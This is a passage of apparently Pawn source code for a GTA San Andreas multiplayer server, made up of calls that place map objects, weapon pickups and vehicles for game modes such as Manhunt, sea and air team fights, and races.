	CreateSObject(3374, 2974.583008, -1764.172852, 26.884537, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.635498, -1764.122070, 29.784538, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.996338, -1756.065186, 20.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.990723, -1756.071655, 23.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.992920, -1756.077759, 26.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2976.009766, -1756.097290, 29.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.645752, -1760.167358, 29.612564, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(8229, 2903.074219, -1788.847168, 19.010769, 0.0000, 0.0000, 167.4860,object_show_distance,0,world_purim);
	CreateSObject(8229, 2906.703125, -1762.869263, 19.010448, 0.0000, 0.0000, 349.5829,object_show_distance,0,world_purim);
	CreateSObject(9339, 2995.255371, -1768.162109, 17.040155, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(9339, 2988.527832, -1814.067017, 16.836887, 0.0000, 0.0000, 350.5462,object_show_distance,0,world_purim);
	CreateSObject(18090, 2934.577881, -1801.454956, 18.948143, 0.0000, 0.0000, 262.8837,object_show_distance,0,world_purim);
	CreateSObject(14537, 2953.794434, -1784.770996, 18.331137, 0.0000, 0.0000, 352.2651,object_show_distance,0,world_purim);
	CreateSObject(14835, 2911.601318, -1773.283813, 17.959442, 0.0000, 0.0000, 350.5462,object_show_distance,0,world_purim);
	CreateSObject(14832, 2953.544678, -1785.925659, 18.459900, 0.0000, 0.0000, 173.5021,object_show_distance,0,world_purim);
	CreateSObject(3503, 2943.434814, -1795.571533, 18.660030, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(14608, 2938.682129, -1765.665161, 18.655790, 0.0000, 0.0000, 127.0925,object_show_distance,0,world_purim);
	CreateSObject(7073, 2961.225098, -1753.885864, 34.657310, 0.0000, 0.0000, 32.6586,object_show_distance,0,world_purim);
	CreateSObject(2780, 2948.807617, -1784.241089, 20.282749, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(2780, 2938.863037, -1764.445801, 20.337582, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(2780, 2934.334717, -1799.981689, 19.926626, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2874.222656, -1770.284424, 15.901511, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2950.431152, -1777.052490, 17.959787, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2950.878906, -1775.267822, 17.965572, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2948.297852, -1789.728516, 17.959787, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(3461, 2948.086426, -1791.825073, 17.959787, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(7392, 2955.265381, -1814.759644, 26.104851, 0.0000, 0.0000, 303.2772,object_show_distance,0,world_purim);
	CreateSObject(3472, 2935.386963, -1781.375122, 16.753933, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(2780, 2934.951904, -1781.156494, 27.330999, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(1570, 2947.157715, -1765.659180, 17.736284, 0.0000, 0.0000, 347.1084,object_show_distance,0,world_purim);
	CreateSObject(990, 2889.074463, -1782.794678, 17.479977, 0.0000, 0.0000, 303.2772,object_show_distance,0,world_purim);
	CreateSObject(990, 2891.643311, -1763.959717, 17.463499, 0.0000, 0.0000, 217.3335,object_show_distance,0,world_purim);
	#endif
	dbg(11,"6.3");
	// Fire Madness
	CreatePickupEx(366,2,1099.9269,1205.6621,10.8203,0,worlds_dmz + dmz_fire); // mataf
	CreatePickupEx(366,2,1153.8784,1205.5021,10.8203,0,worlds_dmz + dmz_fire); // mataf
	CreatePickupEx(366,2,1155.1411,1223.7405,10.8203,0,worlds_dmz + dmz_fire); // mataf
	CreatePickupEx(366,2,1173.5947,1225.3936,10.8125,0,worlds_dmz + dmz_fire); // mataf
	CreatePickupEx(366,2,1100.8251,1359.3652,10.8203,0,worlds_dmz + dmz_fire); // mataf
	CreatePickupEx(366,2,1156.0525,1360.7295,10.8203,0,worlds_dmz + dmz_fire); // mataf
	CreatePickupEx(366,2,1174.5596,1344.0297,10.8125,0,worlds_dmz + dmz_fire); // mataf
	CreatePickupEx(366,2,1158.3368,1344.1885,10.8125,0,worlds_dmz + dmz_fire); // mataf
	CreatePickupEx(361,2,1145.2239,1300.7860,10.8203,0,worlds_dmz + dmz_fire); // laavior
	CreatePickupEx(361,2,1135.1780,1256.9146,10.8203,0,worlds_dmz + dmz_fire); // laavior
	CreatePickupEx(361,2,1125.3557,1219.1978,10.8203,0,worlds_dmz + dmz_fire); // laavior
	CreatePickupEx(361,2,1114.1868,1242.1677,10.8203,0,worlds_dmz + dmz_fire); // laavior
	CreatePickupEx(361,2,1112.4489,1292.4739,10.8203,0,worlds_dmz + dmz_fire); // laavior
	CreatePickupEx(361,2,1113.1542,1338.0865,10.8203,0,worlds_dmz + dmz_fire); // laavior
	dbg(11,"6a");
	// Special Garage
	CreateSObject(7520, 1080.135010, 1924.662842, 10.098577, 0.0000, 0.0000, 180.0000);
	CreateSObject(11391, 1090.290039, 1926.372803, 11.102736, 0.0000, 0.0000, 90.0000);
	CreateSObject(11393, 1090.997192, 1932.741577, 11.338028, 0.0000, 0.0000, 180.0000);
	CreateSObject(14826, 1061.478394, 1931.749878, 10.552339, 0.0000, 0.0000, 180.0000);
	CreateSObject(16107, 1103.108154, 1934.597412, 9.813051, 0.0000, 0.0000, 270.0000);
	// Team Activities
	CreateVehicleEx(464,-973.4568,1060.9358,1344.9771,92.1607,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_miniplane
	CreateVehicleEx(430,296.6416,2950.5928,-0.5759,321.8862,46,26,respawntime,0,worlds_teamact); // seafight t1
	CreateVehicleEx(430,262.5469,2937.5701,-0.6234,12.9332,46,26,respawntime,0,worlds_teamact); // seafight t1
	CreateVehicleEx(430,253.1015,2930.1958,-0.4551,11.6785,46,26,respawntime,0,worlds_teamact); // seafight t1
	CreateVehicleEx(430,236.6858,2938.9941,0.1357,40.0028,46,26,respawntime,0,worlds_teamact); // seafight t1
	CreateVehicleEx(430,212.6662,2948.3933,-0.5278,82.4770,46,26,respawntime,0,worlds_teamact); // seafight t1
	CreateVehicleEx(430,329.2563,2947.4258,0.0554,245.0417,46,26,respawntime,0,worlds_teamact); // seafight t1
	CreateVehicleEx(430,257.7043,2944.2354,0.0755,5.1350,46,26,respawntime,0,worlds_teamact); // seafight t1
	CreateVehicleEx(430,256.7322,2963.2903,0.1221,2.6015,46,26,respawntime,0,worlds_teamact); // seafight t1
	CreateVehicleEx(430,296.3226,3055.8796,-0.5356,182.2163,46,26,respawntime,0,worlds_teamact); // seafight t2
	CreateVehicleEx(430,286.4674,3054.5010,-0.1948,173.8254,46,26,respawntime,0,worlds_teamact); // seafight t2
	CreateVehicleEx(430,277.8345,3055.3083,-0.4811,174.2580,46,26,respawntime,0,worlds_teamact); // seafight t2
	CreateVehicleEx(430,269.2675,3056.0835,-0.4627,173.4426,46,26,respawntime,0,worlds_teamact); // seafight t2
	CreateVehicleEx(430,261.5794,3056.3792,-0.5621,174.5369,46,26,respawntime,0,worlds_teamact); // seafight t2
	CreateVehicleEx(430,253.7164,3056.8433,-0.6686,174.9408,46,26,respawntime,0,worlds_teamact); // seafight t2
	CreateVehicleEx(430,245.5085,3057.4080,-0.6183,175.4467,46,26,respawntime,0,worlds_teamact); // seafight t2
	CreateVehicleEx(430,237.6509,3057.9966,-0.4064,179.4916,46,26,respawntime,0,worlds_teamact); // seafight t2
	CreateVehicleEx(476,429.9746,2517.4316,17.2142,87.6545,6,7,respawntime,0,worlds_teamact + 1); // airfight t1
	CreateVehicleEx(476,428.7335,2505.7527,17.2159,92.9965,7,6,respawntime,0,worlds_teamact + 1); // airfight t1
	CreateVehicleEx(476,428.3282,2493.4946,17.2082,86.9507,1,6,respawntime,0,worlds_teamact + 1); // airfight t1
	CreateVehicleEx(476,411.3877,2464.9404,17.1967,349.4190,103,102,respawntime,0,worlds_teamact + 1); // airfight t1
	CreateVehicleEx(476,390.8267,2465.8647,17.1951,357.9453,77,87,respawntime,0,worlds_teamact + 1); // airfight t1
	CreateVehicleEx(476,390.9790,2442.9729,17.1931,2.6062,119,117,respawntime,0,worlds_teamact + 1); // airfight t1
	CreateVehicleEx(476,410.2150,2442.4900,17.1920,358.8581,89,91,respawntime,0,worlds_teamact + 1); // airfight t1
	CreateVehicleEx(476,387.1777,2540.8848,17.2313,183.0775,71,77,respawntime,0,worlds_teamact + 1); // airfight t1
	CreateVehicleEx(476,-71.3029,2455.5974,16.6369,272.2509,103,102,respawntime,0,worlds_teamact + 1); // airfight t2
	CreateVehicleEx(476,-71.4118,2469.0791,17.1690,273.7694,77,87,respawntime,0,worlds_teamact + 1); // airfight t2
	CreateVehicleEx(476,-72.3420,2483.0200,17.1938,271.5106,71,77,respawntime,0,worlds_teamact + 1); // airfight t2
	CreateVehicleEx(476,-73.4749,2494.9937,17.1904,275.3815,6,7,respawntime,0,worlds_teamact + 1); // airfight t2
	CreateVehicleEx(476,-75.1107,2508.8733,17.2017,269.0209,7,6,respawntime,0,worlds_teamact + 1); // airfight t2
	CreateVehicleEx(476,-76.3087,2522.8079,17.1837,275.2395,1,6,respawntime,0,worlds_teamact + 1); // airfight t2
	CreateVehicleEx(476,-77.1456,2536.5408,17.1699,272.8868,89,91,respawntime,0,worlds_teamact + 1); // airfight t2
	CreateVehicleEx(476,-78.0775,2548.8450,17.2613,276.4925,119,117,respawntime,0,worlds_teamact + 1); // airfight t2
	// Manhunt
	CreateVehicleEx(473,-2680.0557,1584.3536,-0.0836,66.7176,56,56,respawntime,0,world_manhunt);
	CreateVehicleEx(451,2040.0520,1319.2799,10.3779,183.2439,16,16,respawntime,0,world_manhunt);
	CreateVehicleEx(429,2040.5247,1359.2783,10.3516,177.1306,13,13,respawntime,0,world_manhunt);
	CreateVehicleEx(421,2110.4102,1398.3672,10.7552,359.5964,13,13,respawntime,0,world_manhunt);
	CreateVehicleEx(411,2074.9624,1479.2120,10.3990,359.6861,64,64,respawntime,0,world_manhunt);
	CreateVehicleEx(477,2075.6038,1666.9750,10.4252,359.7507,94,94,respawntime,0,world_manhunt);
	CreateVehicleEx(541,2119.5845,1938.5969,10.2967,181.9064,22,22,respawntime,0,world_manhunt);
	CreateVehicleEx(541,1843.7881,1216.0122,10.4556,270.8793,60,1,respawntime,0,world_manhunt);
	CreateVehicleEx(402,1944.1003,1344.7717,8.9411,0.8168,30,30,respawntime,0,world_manhunt);
	CreateVehicleEx(402,1679.2278,1316.6287,10.6520,180.4150,90,90,respawntime,0,world_manhunt);
	CreateVehicleEx(415,1685.4872,1751.9667,10.5990,268.1183,25,1,respawntime,0,world_manhunt);
	CreateVehicleEx(411,2034.5016,1912.5874,11.9048,0.2909,123,1,respawntime,0,world_manhunt);
	CreateVehicleEx(411,2172.1682,1988.8643,10.5474,89.9151,116,1,respawntime,0,world_manhunt);
	CreateVehicleEx(429,2245.5759,2042.4166,10.5000,270.7350,14,14,respawntime,0,world_manhunt);
	CreateVehicleEx(477,2361.1538,1993.9761,10.4260,178.3929,101,1,respawntime,0,world_manhunt);
	CreateVehicleEx(550,2221.9946,1998.7787,9.6815,92.6188,53,53,respawntime,0,world_manhunt);
	CreateVehicleEx(558,2243.3833,1952.4221,14.9761,359.4796,116,1,respawntime,0,world_manhunt);
	CreateVehicleEx(587,2276.7085,1938.7263,31.5046,359.2321,40,1,respawntime,0,world_manhunt);
	CreateVehicleEx(587,2602.7769,1853.0667,10.5468,91.4813,43,1,respawntime,0,world_manhunt);
	CreateVehicleEx(603,2610.7600,1694.2588,10.6585,89.3303,69,1,respawntime,0,world_manhunt);
	CreateVehicleEx(587,2635.2419,1075.7726,10.5472,89.9571,53,1,respawntime,0,world_manhunt);
	CreateVehicleEx(562,2577.2354,1038.8063,10.4777,181.7069,35,1,respawntime,0,world_manhunt);
	CreateVehicleEx(562,2394.1021,989.4888,10.4806,89.5080,17,1,respawntime,0,world_manhunt);
	CreateVehicleEx(562,1881.0510,957.2120,10.4789,270.4388,11,1,respawntime,0,world_manhunt);
	CreateVehicleEx(535,2039.1257,1545.0879,10.3481,359.6690,123,1,respawntime,0,world_manhunt);
	CreateVehicleEx(535,2009.8782,2411.7524,10.5828,178.9618,66,1,respawntime,0,world_manhunt);
	CreateVehicleEx(429,2010.0841,2489.5510,10.5003,268.7720,1,2,respawntime,0,world_manhunt);
	CreateVehicleEx(415,2076.4033,2468.7947,10.5923,359.9186,36,1,respawntime,0,world_manhunt);
	CreateVehicleEx(506,2352.9026,2577.9768,10.5201,0.4091,7,7,respawntime,0,world_manhunt);
	CreateVehicleEx(506,2166.6963,2741.0413,10.5245,89.7816,52,52,respawntime,0,world_manhunt);
	CreateVehicleEx(411,1960.9989,2754.9072,10.5473,200.4316,112,1,respawntime,0,world_manhunt);
	CreateVehicleEx(429,1919.5863,2760.7595,10.5079,100.0753,2,1,respawntime,0,world_manhunt);
	CreateVehicleEx(415,1673.8038,2693.8044,10.5912,359.7903,40,1,respawntime,0,world_manhunt);
	CreateVehicleEx(402,1591.0482,2746.3982,10.6519,172.5125,30,30,respawntime,0,world_manhunt);
	CreateVehicleEx(603,1580.4537,2838.2886,10.6614,181.4573,75,77,respawntime,0,world_manhunt);
	CreateVehicleEx(550,1555.2734,2750.5261,10.6388,91.7773,62,62,respawntime,0,world_manhunt);
	CreateVehicleEx(535,1455.9305,2878.5288,10.5837,181.0987,118,1,respawntime,0,world_manhunt);
	CreateVehicleEx(477,1537.8425,2578.0525,10.5662,0.0650,121,1,respawntime,0,world_manhunt);
	CreateVehicleEx(451,1433.1594,2607.3762,10.3781,88.0013,16,16,respawntime,0,world_manhunt);
	CreateVehicleEx(603,2223.5898,1288.1464,10.5104,182.0297,18,1,respawntime,0,world_manhunt);
	CreateVehicleEx(558,2451.6707,1207.1179,10.4510,179.8960,24,1,respawntime,0,world_manhunt);
	CreateVehicleEx(550,2461.7253,1357.9705,10.6389,180.2927,62,62,respawntime,0,world_manhunt);
	CreateVehicleEx(558,2461.8162,1629.2268,10.4496,181.4625,117,1,respawntime,0,world_manhunt);
	CreateVehicleEx(477,2395.7554,1658.9591,10.5740,359.7374,0,1,respawntime,0,world_manhunt);
	CreateVehicleEx(404,1553.3696,1020.2884,10.5532,270.6825,119,50,respawntime,0,world_manhunt);
	CreateVehicleEx(400,1380.8304,1159.1782,10.9128,355.7117,123,1,respawntime,0,world_manhunt);
	CreateVehicleEx(418,1383.4630,1035.0420,10.9131,91.2515,117,227,respawntime,0,world_manhunt);
	CreateVehicleEx(404,1445.4526,974.2831,10.5534,1.6213,109,100,respawntime,0,world_manhunt);
	CreateVehicleEx(400,1704.2365,940.1490,10.9127,91.9048,113,1,respawntime,0,world_manhunt);
	CreateVehicleEx(404,1658.5463,1028.5432,10.5533,359.8419,101,101,respawntime,0,world_manhunt);
	CreateVehicleEx(581,1677.6628,1040.1930,10.4136,178.7038,58,1,respawntime,0,world_manhunt);
	CreateVehicleEx(581,1383.6959,1042.2114,10.4121,85.7269,66,1,respawntime,0,world_manhunt);
	CreateVehicleEx(581,1064.2332,1215.4158,10.4157,177.2942,72,1,respawntime,0,world_manhunt);
	CreateVehicleEx(581,1111.4536,1788.3893,10.4158,92.4627,72,1,respawntime,0,world_manhunt);
	CreateVehicleEx(522,953.2818,1806.1392,8.2188,235.0706,3,8,respawntime,0,world_manhunt);
	CreateVehicleEx(522,995.5328,1886.6055,10.5359,90.1048,3,8,respawntime,0,world_manhunt);
	CreateVehicleEx(521,993.7083,2267.4133,11.0315,1.5610,75,13,respawntime,0,world_manhunt);
	CreateVehicleEx(535,1439.5662,1999.9822,10.5843,0.4194,66,1,respawntime,0,world_manhunt);
	CreateVehicleEx(522,1430.2354,1999.0144,10.3896,352.0951,6,25,respawntime,0,world_manhunt);
	CreateVehicleEx(522,2156.3540,2188.6572,10.2414,22.6504,6,25,respawntime,0,world_manhunt);
	CreateVehicleEx(598,2277.6846,2477.1096,10.5652,180.1090,0,1,respawntime,0,world_manhunt);
	CreateVehicleEx(598,2268.9888,2443.1697,10.5662,181.8062,0,1,respawntime,0,world_manhunt);
	CreateVehicleEx(598,2256.2891,2458.5110,10.5680,358.7335,0,1,respawntime,0,world_manhunt);
	CreateVehicleEx(598,2251.6921,2477.0205,10.5671,179.5244,0,1,respawntime,0,world_manhunt);
	CreateVehicleEx(523,2294.7305,2441.2651,10.3860,9.3764,0,0,respawntime,0,world_manhunt);
	CreateVehicleEx(523,2290.7268,2441.3323,10.3944,16.4594,0,0,respawntime,0,world_manhunt);
	CreateVehicleEx(523,2295.5503,2455.9656,2.8444,272.6913,0,0,respawntime,0,world_manhunt);
	CreateVehicleEx(522,2476.7900,2532.2222,21.4416,0.5081,8,82,respawntime,0,world_manhunt);
	CreateVehicleEx(522,2580.5320,2267.9595,10.3917,271.2372,8,82,respawntime,0,world_manhunt);
	CreateVehicleEx(522,2814.4331,2364.6641,10.3907,89.6752,36,105,respawntime,0,world_manhunt);
	CreateVehicleEx(535,2827.4143,2345.6953,10.5768,270.0668,97,1,respawntime,0,world_manhunt);
	CreateVehicleEx(521,1670.1089,1297.8322,10.3864,359.4936,87,118,respawntime,0,world_manhunt);
	CreateVehicleEx(415,1319.1038,1279.1791,10.5931,0.9661,62,1,respawntime,0,world_manhunt);
	CreateVehicleEx(521,1710.5763,1805.9275,10.3911,176.5028,92,3,respawntime,0,world_manhunt);
	CreateVehicleEx(521,2805.1650,2027.0028,10.3920,357.5978,92,3,respawntime,0,world_manhunt);
	CreateVehicleEx(535,2822.3628,2240.3594,10.5812,89.7540,123,1,respawntime,0,world_manhunt);
	CreateVehicleEx(521,2876.8013,2326.8418,10.3914,267.8946,115,118,respawntime,0,world_manhunt);
	CreateVehicleEx(429,2842.0554,2637.0105,10.5000,182.2949,1,3,respawntime,0,world_manhunt);
	CreateVehicleEx(549,2494.4214,2813.9348,10.5172,316.9462,72,39,respawntime,0,world_manhunt);
	CreateVehicleEx(549,2327.6484,2787.7327,10.5174,179.5639,75,39,respawntime,0,world_manhunt);
	CreateVehicleEx(549,2142.6970,2806.6758,10.5176,89.8970,79,39,respawntime,0,world_manhunt);
	CreateVehicleEx(521,2139.7012,2799.2114,10.3917,229.6327,25,118,respawntime,0,world_manhunt);
	CreateVehicleEx(521,2104.9446,2658.1331,10.3834,82.2700,36,0,respawntime,0,world_manhunt);
	CreateVehicleEx(521,1914.2322,2148.2590,10.3906,267.7297,36,0,respawntime,0,world_manhunt);
	CreateVehicleEx(549,1904.7527,2157.4312,10.5175,183.7728,83,36,respawntime,0,world_manhunt);
	CreateVehicleEx(549,1532.6139,2258.0173,10.5176,359.1516,84,36,respawntime,0,world_manhunt);
	CreateVehicleEx(521,1534.3204,2202.8970,10.3644,4.9108,118,118,respawntime,0,world_manhunt);
	CreateVehicleEx(549,1613.1553,2200.2664,10.5176,89.6204,89,35,respawntime,0,world_manhunt);
	CreateVehicleEx(400,1552.1292,2341.7854,10.9126,274.0815,101,1,respawntime,0,world_manhunt);
	CreateVehicleEx(404,1637.6285,2329.8774,10.5538,89.6408,101,101,respawntime,0,world_manhunt);
	CreateVehicleEx(400,1357.4165,2259.7158,10.9126,269.5567,62,1,respawntime,0,world_manhunt);
	CreateVehicleEx(411,1281.7458,2571.6719,10.5472,270.6128,106,1,respawntime,0,world_manhunt);
	CreateVehicleEx(522,1305.5295,2528.3076,10.3955,88.7249,3,8,respawntime,0,world_manhunt);
	CreateVehicleEx(521,993.9020,2159.4194,10.3905,88.8805,74,74,respawntime,0,world_manhunt);
	CreateVehicleEx(415,1512.7134,787.6931,10.5921,359.5796,75,1,respawntime,0,world_manhunt);
	CreateVehicleEx(522,2299.5872,1469.7910,10.3815,258.4984,3,8,respawntime,0,world_manhunt);
	CreateVehicleEx(522,2133.6428,1012.8537,10.3789,87.1290,3,8,respawntime,0,world_manhunt);
	CreateVehicleEx(415,2266.7336,648.4756,11.0053,177.8517,0,1,respawntime,0,world_manhunt);
	CreateVehicleEx(461,2404.6636,647.9255,10.7919,183.7688,53,1,respawntime,0,world_manhunt);
	CreateVehicleEx(506,2628.1047,746.8704,10.5246,352.7574,3,3,respawntime,0,world_manhunt);
	CreateVehicleEx(549,2817.6445,928.3469,10.4470,359.5235,72,39,respawntime,0,world_manhunt);
	// Race
	CreateSObject(3471, 2039.049805, 843.234314, 6.816479, 0.0000, 0.0000, 90.0000);
	CreateSObject(3471, 2075.537598, 843.260376, 6.727666, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, 2056.614258, 794.508728, 11.545418, 8.5944, 0.0000, 181.4063);
	CreateSObject(1632, 2056.614258, 794.508728, 11.545418, 8.5944, 0.0000, 181.4063);
	CreateSObject(3374, 2072.559814, 798.497131, 14.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2072.683350, 798.408508, 17.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2072.720215, 798.418701, 20.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2072.713867, 798.363708, 23.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2068.751465, 798.323486, 23.286760, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2066.741943, 798.348267, 22.239283, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2064.655518, 798.394104, 20.139299, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2063.561035, 798.372375, 17.314304, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2064.546387, 798.301819, 14.289282, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2066.970947, 798.510742, 12.164288, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2072.459717, 798.532104, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2049.490479, 798.390259, 11.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2048.613281, 798.395813, 14.314289, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2047.739380, 798.495605, 17.347559, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2046.952637, 798.487366, 20.347559, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2045.934692, 798.516602, 23.347559, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2042.955811, 798.505676, 20.339315, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2039.982544, 798.550476, 23.343601, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2039.033569, 798.552856, 20.314308, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2038.039795, 798.602966, 17.664291, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2037.026489, 798.558167, 14.679302, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2035.952759, 798.575256, 11.714283, 0.0000, 0.0000, 0.0000);
	CreateSObject(624, 2087.911621, 798.004456, -2.775690, 0.0000, 0.0000, 0.0000);
	CreateSObject(624, 2025.558594, 799.179443, -3.090203, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2069.966553, 798.596375, 11.348626, 0.0000, 0.0000, 0.0000);
	CreateSObject(3524, 2068.244141, 798.404236, 15.455667, 0.0000, 0.0000, 180.0000);
	CreateSObject(3515, 2042.558228, 798.385071, 10.463923, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, 2042.888916, 798.606140, 23.420351, 0.0000, 0.0000, 0.0000);
	CreateSObject(3279, 2030.102051, 860.488586, 5.842371, 0.0000, 0.0000, 270.0000);
	CreateSObject(3279, 2084.731689, 860.710938, 5.852720, 0.0000, 0.0000, 269.9999);
	CreateSObject(16644, 2071.810059, 860.737732, 22.757618, 0.0000, 0.0000, 0.0000);
	CreateSObject(16644, 2054.817627, 860.797485, 22.757618, 0.0000, 0.0000, 0.0000);
	CreateSObject(16644, 2040.305908, 860.841919, 22.769379, 0.0000, 0.0000, 0.0000);
	// New Race
	CreateSObject(13664,-233.88,1787.84,1199.28,0.00,0.00,0.00);
	CreateSObject(13665,-233.89,1787.84,1199.23,-0.02,0.00,0.00);
	CreateSObject(13663,-234.08,1787.85,1199.25,0.00,0.00,0.00);
	CreateSObject(13662,-233.84,1787.80,1199.25,0.00,0.00,0.00);
	CreateSObject(13656,-147.21,1772.12,1187.29,0.00,0.00,0.00);
	CreateSObject(13641,-209.96,1776.65,1195.37,0.00,0.00,177.26);
	CreateSObject(13629,-205.03,1738.60,1208.62,0.00,0.00,85.80);
	CreateSObject(13629,-202.95,1835.09,1208.34,0.00,0.00,253.66);
	CreateSObject(10145,-253.77,1803.56,1240.37,0.00,0.00,0.00);
	CreateSObject(16114,-302.68,1666.86,1194.58,0.00,0.00,105.92);
	CreateSObject(16114,-262.19,1663.60,1194.58,0.00,0.00,113.90);
	CreateSObject(16114,-220.70,1660.83,1194.58,0.00,0.00,113.90);
	CreateSObject(16114,-180.32,1661.85,1194.58,0.00,0.00,113.90);
	CreateSObject(16114,-141.58,1662.59,1194.58,0.00,0.00,113.90);
	CreateSObject(16114,-60.63,1741.25,1193.44,0.00,0.00,199.76);
	CreateSObject(16114,-95.98,1668.46,1193.64,0.00,0.00,130.95);
	CreateSObject(16114,-62.70,1698.97,1193.64,0.00,0.00,188.77);
	CreateSObject(16114,-56.33,1784.62,1193.44,0.00,0.00,199.76);
	CreateSObject(16114,-57.33,1826.32,1197.04,0.00,0.00,199.76);
	CreateSObject(16114,-101.53,1869.54,1196.73,0.00,0.00,273.57);
	CreateSObject(16114,-66.49,1853.80,1196.73,0.00,0.00,238.47);
	CreateSObject(16114,-144.11,1878.24,1196.73,0.00,0.00,282.86);
	CreateSObject(16114,-173.98,1879.95,1197.03,0.00,0.00,287.49);
	CreateSObject(16114,-205.78,1881.97,1196.73,0.00,0.00,281.39);
	CreateSObject(16114,-237.26,1883.73,1196.12,0.00,0.00,294.92);
	CreateSObject(16114,-269.60,1882.43,1196.12,0.00,0.00,294.92);
	CreateSObject(16114,-309.32,1878.86,1196.12,0.00,0.00,294.92);
	CreateSObject(16114,-338.18,1867.41,1196.82,0.00,0.00,334.77);
	CreateSObject(16114,-356.09,1822.56,1194.51,0.00,0.00,16.94);
	CreateSObject(16114,-351.70,1784.49,1193.91,0.00,0.00,21.71);
	CreateSObject(16114,-339.02,1689.65,1193.91,0.00,0.00,50.41);
	CreateSObject(16114,-350.20,1757.81,1193.91,0.00,0.00,21.71);
	CreateSObject(16114,-347.87,1722.26,1193.91,0.00,0.00,21.71);
	CreateSObject(3437,-359.00,1749.08,1242.74,0.00,0.00,0.00);
	CreateSObject(3437,-358.92,1754.62,1231.65,91.00,0.00,0.00);
	CreateSObject(3437,-358.85,1760.11,1242.43,0.00,0.00,0.00);
	CreateSObject(3437,-358.93,1760.10,1237.26,0.00,0.00,0.00);
	CreateSObject(3437,-359.00,1749.08,1237.26,0.00,0.00,0.00);
	CreateSObject(3437,-358.69,1774.61,1242.16,0.00,0.00,0.00);
	CreateSObject(3437,-358.49,1796.92,1242.08,0.00,0.00,0.00);
	CreateSObject(3437,-358.56,1778.85,1243.27,40.00,0.00,0.00);
	CreateSObject(3437,-358.55,1778.55,1235.07,135.00,0.00,0.00);
	CreateSObject(3437,-358.89,1774.61,1236.85,0.00,0.00,0.00);
	CreateSObject(3437,-358.57,1796.91,1236.85,0.00,0.00,0.00);
	CreateSObject(3437,-358.14,1800.05,1242.61,33.00,0.00,0.00);
	CreateSObject(3437,-358.14,1800.05,1242.61,33.00,0.00,0.00);
	CreateSObject(3437,-358.13,1805.27,1242.61,-25.00,0.00,0.00);
	CreateSObject(3437,-358.14,1807.66,1242.08,0.00,0.00,0.00);
	CreateSObject(3437,-358.14,1807.68,1236.85,0.00,0.00,0.00);
	// Las Venturas Objects
	CreateSObject(3528, 2009.675781, 1350.988159, 21.300491, 0.0000, 0.0000, 357.1875);
	CreateSObject(3528, 2009.675781, 1334.745728, 21.432787, 0.0000, 0.0000, 0.0000);
	CreateSObject(3437, 2147.739990, 1299.677490, 21.207174, 0.0000, 0.0000, 277.0313);
	CreateSObject(3437, 2149.624268, 1294.861816, 16.440632, 358.2811, 89.3814, 277.8123);
	CreateSObject(3437, 2146.569092, 1278.444458, 19.887665, 0.0000, 338.5141, 273.4378);
	CreateSObject(3437, 2146.620117, 1274.328857, 19.902866, 0.0000, 19.7670, 270.0000);
	CreateSObject(16151, 2130.265381, 1327.254883, 10.210698, 0.0000, 0.0000, 0.0000);
	CreateSObject(16152, 2124.139160, 1324.758789, 9.816128, 0.0000, 0.0000, 90.0000);
	CreateSObject(16152, 2114.897705, 1324.762573, 9.816128, 0.0000, 0.0000, 90.0000);
	CreateSObject(16152, 2125.605225, 1341.651367, 9.818687, 0.0000, 0.0000, 270.0000);
	CreateSObject(16152, 2116.372559, 1341.662964, 9.816128, 0.0000, 0.0000, 270.0000);
	CreateSObject(643, 2122.601563, 1335.948608, 10.290784, 0.0000, 0.0000, 0.0000);
